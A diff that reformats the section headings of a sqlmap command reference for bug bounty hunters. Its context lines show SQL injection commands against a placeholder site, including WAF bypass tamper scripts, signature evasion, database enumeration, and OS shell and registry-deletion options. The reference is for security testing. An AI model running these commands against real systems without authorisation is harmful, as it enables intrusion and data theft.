@@ -1,6 +1,6 @@
 
-SQLMAP COMPLETE COMMAND REFERENCE
-For Bug Bounty Hunters & Security Researchers
+**SQLMAP COMPLETE COMMAND REFERENCE
+For Bug Bounty Hunters & Security Researchers**
 
 
 TABLE OF CONTENTS
@@ -18,7 +18,8 @@ TABLE OF CONTENTS
 
     
 ================================================================================
-1. TARGET SPECIFICATION
+
+**1. TARGET SPECIFICATION**
 
 Defining what you are attacking.
 Basic URL Scan (GET parameter):
@@ -67,8 +68,9 @@ sqlmap -u "http://site.com/page?id=1*"
 - Marks exact injection point with *
 
 ================================================================================
-2. REQUEST MODIFICATION
-================================================================================
+
+**2. REQUEST MODIFICATION**
+
 Tweaking how sqlmap talks to the server to bypass filters or maintain sessions.
 
 Random User-Agent (Avoids sqlmap signature):
@@ -125,8 +127,9 @@ Referer Header:
 sqlmap -u "http://site.com/page?id=1" --referer="http://site.com/home"
 
 ================================================================================
-3. OPTIMIZATION & PERFORMANCE
-================================================================================
+
+**3. OPTIMIZATION & PERFORMANCE**
+
 Commands to speed up scanning during time-constrained engagements.
 
 Increase Concurrent Requests:
@@ -163,8 +166,9 @@ sqlmap -u "http://site.com/page?id=1" -v 3
 - Levels: 0-6 (0=minimal, 6=maximum)
 
 ================================================================================
-4. INJECTION TECHNIQUES
-================================================================================
+
+**4. INJECTION TECHNIQUES**
+
 Specifying or limiting the type of SQL injection to test.
 
 Specify Injection Techniques:
@@ -222,8 +226,8 @@ Union Character:
 sqlmap -u "http://site.com/page?id=1" --union-char="a"
 
 ================================================================================
-5. ENUMERATION (DATA EXTRACTION)
-================================================================================
+
+**5. ENUMERATION (DATA EXTRACTION)**
 Once an injection is found, these commands extract data.
 
 Get DBMS Banner/Version:
@@ -320,8 +324,9 @@ Pivot Column:
 sqlmap -u "http://site.com/page?id=1" -D db -T table --pivot-column=id
 
 ================================================================================
-6. DATABASE-SPECIFIC COMMANDS
-================================================================================
+
+**6. DATABASE-SPECIFIC COMMANDS**
+
 While sqlmap auto-detects DBMS, manual specification speeds up attacks.
 
 Specify Database Type:
@@ -437,8 +442,8 @@ Oracle Complete Example:
 sqlmap -r request.txt --dbms=oracle --no-cast --tamper="greatest,space2comment" --batch
 
 ================================================================================
-7. WAF BYPASS & TAMPER SCRIPTS
-================================================================================
+
+**7. WAF BYPASS & TAMPER SCRIPTS**
 Modern WAFs (Cloudflare, AWS WAF, Akamai) block SQL keywords using signatures.
 Tamper scripts obfuscate payloads while maintaining execution.
 
@@ -679,8 +684,9 @@ ModSecurity Bypass:
 sqlmap -r request.txt --tamper="space2comment,between,versionedmorekeywords" --random-agent --delay=1 --batch
 
 ================================================================================
-8. ADVANCED & OS ACCESS
-================================================================================
+
+**8. ADVANCED & OS ACCESS**
+
 If you have DBA privileges, you can escalate to the Operating System.
 
 Interactive OS Shell (RCE):
@@ -723,8 +729,9 @@ sqlmap -u "http://site.com/page?id=1" --reg-del
 sqlmap -u "http://site.com/page?id=1" --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE"
 
 ================================================================================
-9. BUG BOUNTY PRO-MODE FLAGS
-================================================================================
+
+**9. BUG BOUNTY PRO-MODE FLAGS**
+
 Combinations often used to automate or handle tricky scenarios.
 
 Batch Mode (No user prompts - ESSENTIAL):
@@ -828,8 +835,8 @@ Check Dependencies:
 sqlmap --dependencies
 
 ================================================================================
-10. COMPLETE WORKFLOW EXAMPLES
-================================================================================
+
+**10. COMPLETE WORKFLOW EXAMPLES**
 
 --- BASIC WORKFLOWS ---
 
